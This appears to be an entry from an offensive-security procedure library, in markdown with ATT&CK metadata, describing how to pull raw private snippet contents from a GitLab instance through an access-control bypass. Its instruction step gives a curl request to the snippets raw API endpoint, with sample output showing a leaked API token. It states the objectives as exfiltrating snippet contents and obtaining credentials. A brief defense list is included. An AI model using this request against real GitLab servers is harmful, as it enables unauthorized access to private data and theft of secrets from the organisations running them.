---
tags:
  - gitlab
  - api
  - exfiltration
  - snippets
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-retrieve-gitlab-snippet-raw]]'
platforms:
  - Web
  - GitLab
techniques:
  - '[[T1213.003]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: fd806fa5-172a-40da-b2b8-7665935a1e8f
created_at: '2025-12-14T17:32:10.395Z'
updated_at: '2025-12-14T17:32:10.395Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[T1213.003]]'
---
# Retrieve-Private-Snippet-Content-via-API

## Summary

This procedure retrieves the raw contents of a private snippet using the GitLab API, exposing sensitive data due to the access control bypass.

## Description

Following metadata disclosure, target the /projects/:id/snippets/:id/raw endpoint with the snippet ID to fetch plaintext content. This can leak API tokens or secrets, leading to broader compromises. Uses the same token as listing.

## Requirements

1. Snippet ID from previous API response
2. Valid API token
3. HTTP client like curl

## Defense

Defensive measures and detection strategies:

- Audit and revoke overly permissive API tokens
- Enable snippet access logging and alert on raw content requests
- Migrate to fixed GitLab versions

## Objectives

1. Exfiltrate private snippet contents
2. Access sensitive information like credentials
3. Demonstrate full impact of the vulnerability

## Instructions

### Step 1: Request Raw Content

**Context**: Use the snippet ID to pull the unfiltered content.

**Command** ([[commands/curl-retrieve-gitlab-snippet-raw]]):
```bash
curl --header "PRIVATE-TOKEN: XXXXXXXXXXXXXX" "http://gitlab-instance/api/v3/projects/1/snippets/6/raw"
```

> Output is the raw text, e.g., 'These are the contents of a private snippet. API_TOKEN=leakedsecret'. Verify for sensitive data.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[T1213.003]]

### Sub-Techniques


## Commands Used

- [[commands/curl-retrieve-gitlab-snippet-raw]]

## Tools Used

- [[tools/curl]]

## Tags

- [[Exfiltration]]
- [[snippets]]
